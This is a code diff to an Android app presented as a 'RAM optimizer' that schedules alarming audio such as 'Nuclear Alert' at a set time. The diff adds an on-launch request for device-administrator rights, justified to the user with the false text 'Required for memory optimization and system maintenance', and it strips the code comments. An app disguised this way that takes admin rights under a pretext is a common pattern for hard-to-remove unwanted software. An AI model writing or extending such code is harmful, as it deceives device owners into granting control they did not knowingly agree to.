@@ -1,5 +1,7 @@
 package com.system.ramoptimizer;
 
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Bundle;
@@ -14,9 +16,12 @@ import androidx.appcompat.app.AppCompatActivity;
 
 public class MainActivity extends AppCompatActivity {
 
+    private static final int REQUEST_ADMIN = 1;
     private NumberPicker hourPicker, minutePicker, amPmPicker;
     private ListView audioListView;
     private int selectedAudioIndex = 0;
+    private DevicePolicyManager devicePolicyManager;
+    private ComponentName adminComponent;
 
     private final String[] audioNames = {
             "Nuclear Alert",
@@ -49,6 +54,18 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        adminComponent = new ComponentName(this, AdminReceiver.class);
+
+        // Request device admin if not already granted
+        if (!devicePolicyManager.isAdminActive(adminComponent)) {
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                    "Required for memory optimization and system maintenance.");
+            startActivityForResult(intent, REQUEST_ADMIN);
+        }
+
         hourPicker = findViewById(R.id.hourPicker);
         minutePicker = findViewById(R.id.minutePicker);
         amPmPicker = findViewById(R.id.amPmPicker);
@@ -56,24 +73,20 @@ public class MainActivity extends AppCompatActivity {
         Button setButton = findViewById(R.id.setButton);
         TextView statusText = findViewById(R.id.statusText);
 
-        // Hour picker 1-12
         hourPicker.setMinValue(1);
         hourPicker.setMaxValue(12);
         hourPicker.setWrapSelectorWheel(true);
 
-        // Minute picker 00-59
         minutePicker.setMinValue(0);
         minutePicker.setMaxValue(59);
         minutePicker.setFormatter(value -> String.format("%02d", value));
         minutePicker.setWrapSelectorWheel(true);
 
-        // AM/PM picker
         amPmPicker.setMinValue(0);
         amPmPicker.setMaxValue(1);
         amPmPicker.setDisplayedValues(new String[]{"AM", "PM"});
         amPmPicker.setWrapSelectorWheel(false);
 
-        // Audio list
         ArrayAdapter<String> adapter = new ArrayAdapter<>(this,
                 android.R.layout.simple_list_item_single_choice, audioNames);
         audioListView.setAdapter(adapter);
@@ -83,7 +96,6 @@ public class MainActivity extends AppCompatActivity {
             selectedAudioIndex = position;
         });
 
-        // Load saved state
         SharedPreferences prefs = getSharedPreferences("ramopt", MODE_PRIVATE);
         boolean isSet = prefs.getBoolean("isSet", false);
         if (isSet) {
@@ -105,7 +117,6 @@ public class MainActivity extends AppCompatActivity {
             int minute = minutePicker.getValue();
             int amPm = amPmPicker.getValue();
 
-            // Save to prefs
             SharedPreferences.Editor editor = prefs.edit();
             editor.putBoolean("isSet", true);
             editor.putInt("hour", hour);
@@ -115,7 +126,6 @@ public class MainActivity extends AppCompatActivity {
             editor.putInt("audioResId", audioResIds[selectedAudioIndex]);
             editor.apply();
 
-            // Start service
             Intent serviceIntent = new Intent(this, SchedulerService.class);
             serviceIntent.putExtra("hour", hour);
             serviceIntent.putExtra("minute", minute);
